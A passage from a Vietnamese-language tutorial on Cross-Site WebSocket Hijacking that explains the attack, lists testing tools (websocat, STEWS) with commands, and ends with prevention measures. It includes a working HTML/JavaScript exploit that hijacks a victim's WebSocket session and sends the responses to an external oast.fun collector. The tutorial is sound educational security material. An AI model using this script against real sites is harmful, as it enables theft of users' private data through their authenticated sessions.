Nếu kết nối được thiết lập thành công và có thể gửi và nhận dữ liệu từ WebSocket, ứng dụng web đang bị tấn công **CSWH**.

### **Khai Thác CSWH**

Để khai thác lỗ hổng CSWH, kẻ tấn công sẽ tạo một trang web chứa mã độc mà khi nạn nhân đăng nhập vào ứng dụng và truy cập trang web này, mã độc sẽ gửi yêu cầu WebSocket giả mạo với Origin giả mạo. Sau đó, trình duyệt của nạn nhân sẽ gửi cookie phiên của người dùng cùng với yêu cầu, tạo ra một kết nối WebSocket hợp lệ dưới danh nghĩa người dùng đã đăng nhập. Vì WebSocket không bị hạn chế bởi chính sách Same-Origin, kẻ tấn công sẽ có toàn quyền truy cập vào kết nối WebSocket của nạn nhân.

### **Ví Dụ Mã Exploit**

Dưới đây là ví dụ mã khai thác CSWH:

```html
<script>
  function send_message(event) {
    socket.send('!get_messages');
  };

  const socket = new WebSocket('ws://172.17.0.2:80/messages');
  socket.onopen = send_message;
  socket.addEventListener('message', ev => {
    fetch('http://ch23a202vtc0000138p0getbibyyyyyyb.oast.fun/', {method: 'POST', mode: 'no-cors', body: ev.data});
  });
</script>
```

Khi kẻ tấn công thực thi mã này trên trang web mà nạn nhân truy cập, một kết nối WebSocket sẽ được tạo ra với ứng dụng bị tấn công, và tin nhắn sẽ được gửi đến server. Dữ liệu phản hồi sẽ được lấy và gửi đi thông qua **interact.sh** hoặc một dịch vụ tương tự để thu thập dữ liệu.

### **Điều Kiện Tấn Công Thành Công**

Để tấn công CSWH thành công, các cookie phiên phải được thiết lập với thuộc tính **SameSite=None**. Nếu không, cookie sẽ không được gửi trong các yêu cầu cross-origin, và cuộc tấn công sẽ không thành công. Điều này đòi hỏi ứng dụng web phải có cấu hình không an toàn, nơi **SameSite cookie attribute** không được thiết lập đúng.

---
# 16. Công cụ Tấn công và Phòng ngừa WebSocket

#### Công cụ - Tương tác với WebSocket
Các công cụ dòng lệnh như `websocat` có thể thay thế Burp Suite trong việc thao tác và phát lại các tin nhắn WebSocket. Để cài đặt `websocat`, bạn có thể tải về bản biên dịch sẵn từ kho GitHub và chạy các lệnh dưới đây:
```bash
chmod +x websocat_max.x86_64-unknown-linux-musl
./websocat_max.x86_64-unknown-linux-musl -h
```
Ví dụ, bạn có thể kết nối với WebSocket sử dụng lệnh sau:
```bash
./websocat_max.x86_64-unknown-linux-musl ws://172.17.0.2/echo
```
Công cụ này cung cấp tính năng tương tác với WebSocket tương tự như `netcat` hay `curl`, và bạn có thể sử dụng nó để thử nghiệm kết nối WebSocket.

#### Công cụ - Phát hiện Lỗ hổng
**STEWS** (Security Testing and Enumeration of WebSockets) là một công cụ hữu ích để kiểm tra và phân tích các đặc tính của kết nối WebSocket. Công cụ này giúp xác định các lỗ hổng bảo mật cụ thể trong WebSocket bằng cách nhận diện chính xác các cài đặt của máy chủ WebSocket. Bạn có thể chạy STEWS với các cờ khác nhau để kiểm tra các lỗ hổng như CSWH (Cross-Site WebSocket Hijacking).

Ví dụ, bạn có thể chạy STEWS để nhận diện fingerprint của WebSocket:
```bash
python3 STEWS-fingerprint.py -u websockets.htb/messages -n -5
```
Kết quả sẽ cho thấy fingerprint của máy chủ WebSocket, giúp bạn xác định công nghệ đang sử dụng và có thể tối ưu hóa các cuộc tấn công.

#### Phát hiện Lỗ hổng CSWH
Bạn có thể sử dụng STEWS để phát hiện lỗ hổng CSWH bằng cách kiểm tra các yêu cầu WebSocket với cờ `-1`:
```bash
python3 STEWS-vuln-detect.py -n -u websockets.htb/messages -1
```
Công cụ sẽ báo cáo nếu máy chủ WebSocket có lỗ hổng CSWH, chẳng hạn như cho phép bất kỳ nguồn gốc nào (origin) trong tiêu đề `Origin`.

#### Phòng ngừa Lỗ hổng WebSocket

**Phòng ngừa CSWH:** Để ngăn chặn tấn công CSWH, có thể thực hiện các biện pháp bảo mật như:
- Kiểm tra tiêu đề `Origin` trong yêu cầu WebSocket để đảm bảo nó đến từ một nguồn hợp lệ.
- Triển khai mã thông báo CSRF trong WebSocket handshake.
- Cấu hình cookie `SameSite` an toàn để giảm nguy cơ bị tấn công khi không sử dụng `wss://`.

**Cấu hình bảo mật chung:** Các biện pháp bảo vệ WebSocket bao gồm:
- Luôn sử dụng `wss://` thay vì `ws://` để mã hóa kết nối với TLS, giúp bảo vệ dữ liệu khỏi các cuộc tấn công Man-in-the-Middle (MitM).
- Vệ sinh dữ liệu nhận được qua WebSocket giống như khi bạn xử lý dữ liệu trong các yêu cầu HTTP. Điều này giúp ngăn chặn các cuộc tấn công như SQL Injection (SQLi) và Cross-Site Scripting (XSS).

Với những biện pháp này, bạn có thể đảm bảo rằng WebSocket của mình được bảo mật và ít bị tổn thương trước các cuộc tấn công phổ biến.
